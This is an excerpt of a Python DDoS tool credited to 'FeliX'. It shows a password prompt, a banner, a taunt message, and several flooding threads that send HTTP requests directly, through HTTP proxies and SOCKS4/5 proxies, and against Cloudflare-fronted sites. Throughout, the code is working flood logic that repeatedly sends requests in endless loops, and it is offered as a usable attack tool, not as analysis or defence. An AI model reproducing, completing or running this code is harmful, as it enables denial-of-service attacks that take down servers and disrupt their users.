...
ref = ['Your_Server_Got_DDoS_By_FeliX_Never_Surrender_Boys_!',
'Your_Server_Got_DDoS_By_FeliX_Never_Surrender_Boys_!',
'Your_Server_Got_DDoS_By_FeliX_Never_Surrender_Boys_!',
'Your_Server_Got_DDoS_By_FeliX_Never_Surrender_Boys_!',
'Your_Server_Got_DDoS_By_FeliX_Never_Surrender_Boys_!',
'Your_Server_Got_DDoS_By_FeliX_Never_Surrender_Boys_!',
...
os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title SuSpENd By FelIX")
password = input("[!]What Is The Password: ")
if password == 'Fangchunsia':
...
def logo():
    ...
    print("                    [INFO PERSONAL]                          ")
    print("")
    print(" [+]=============== [VERSION:PERSONAL]      ===============[+]")
    print(" [+]=============== [TOOLS CODE BY FeliX]   ===============[+]")
    print(" [+]=============== [AUTHOR:FeliX]          ===============[+]")
    print(" [+]=============== [NOTE:DONT LEAK TOOLS!] ===============[+]")                                                                                            
...
def numthreads():
    ...
    try:
        ...
        threads = int()
        ...
        while True:
            try:
                if method_attack == "1":
                    ...
                    requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
                print("[+] Felix SuSpEnD Tools Attack | Raw-DoS @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                while True:
                    try:
                        for _ in range(100):
                            if method_attack == "1":
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                #req_code += 1
                #sys.stdout.write("[!] Felix SuSpEnD Tools Attack | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                #sys.stdout.flush()
                print("[!] Felix SuSpEnD Tools Attack | Proxy @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                print("[!] Felix SuSpEnD Tools Attack | Socks5 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                ...
                try:
                    ...
                    if str(port) == '443':
                        s = ssl.wrap_socket(s)
                    s.send(str.encode(request))
                    print("[!] Felix SuSpEnD Tools Attack | Socks4 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                    try:
                        for y in range(multiple):
                            s.send(str.encode(request))
                    except:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                print("[+] Felix SuSpEnD Tools Attack | Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                #req_code += 1
                #sys.stdout.write("[!] Felix SuSpEnD Tools Attack | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                #sys.stdout.flush()
                try:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                print("[+] Felix SuSpEnD Tools Attack | cLouDfLAre @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                try:
                    for y in range(multiple):
                        http.request("GET", url,headers=headersx)
                except:
